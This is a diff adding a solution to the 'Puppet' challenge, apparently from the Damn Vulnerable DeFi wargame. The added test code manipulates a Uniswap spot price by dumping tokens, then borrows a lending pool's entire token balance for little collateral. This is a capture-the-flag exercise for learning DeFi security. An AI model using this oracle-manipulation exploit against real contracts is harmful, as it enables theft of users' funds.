@@ -103,6 +103,39 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        //Connect attacker to exchange and token and retrieve instance
+        let attackerUniswapExchangeInstance = await this.uniswapExchange.connect(attacker)
+        let attackerTokenInstance = await this.token.connect(attacker)
+        //Approve and swap 1000 DVT tokens and get at least 9 ETH
+        await attackerTokenInstance.approve(
+            this.uniswapExchange.address,
+            ATTACKER_INITIAL_TOKEN_BALANCE
+        );
+        await attackerUniswapExchangeInstance.tokenToEthSwapInput(
+            ethers.utils.parseEther("1000"),                                                          // min_liquidity
+            ethers.utils.parseEther("9"), 
+           (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
+            { gasLimit: 1e6 }
+        );    
+        
+        //Calculate the price that I will be charged to borrow all the tokens from the lending pool
+        let balanceExchangeETH = await ethers.provider.getBalance(attackerUniswapExchangeInstance.address)
+        let balanceExchangeToken = await this.token.balanceOf(attackerUniswapExchangeInstance.address)
+
+        let price = (balanceExchangeETH.mul(ethers.BigNumber.from("10").pow(ethers.BigNumber.from("18")))).div(balanceExchangeToken)
+        let amountRequiredOfETH = (await this.token.balanceOf(this.lendingPool.address)).mul(price).mul(ethers.BigNumber.from("2")).div(ethers.BigNumber.from("10").pow(ethers.BigNumber.from("18")))
+        
+        let attackerLendingPoolInstance = await this.lendingPool.connect(attacker)
+        
+        let balancePoolToken = await this.token.balanceOf(this.lendingPool.address)
+        
+        await attackerLendingPoolInstance.borrow(balancePoolToken, {value: amountRequiredOfETH, gasLimit: 1e6})
+        //Get 1 DVT token to pass the last assertion
+        await attackerUniswapExchangeInstance.ethToTokenSwapOutput(
+            1,
+            (await ethers.provider.getBlock('latest')).timestamp * 2,// deadline
+            { value: ethers.utils.parseEther("1"), gasLimit: 1e6 }
+        )
     });
 
     after(async function () {
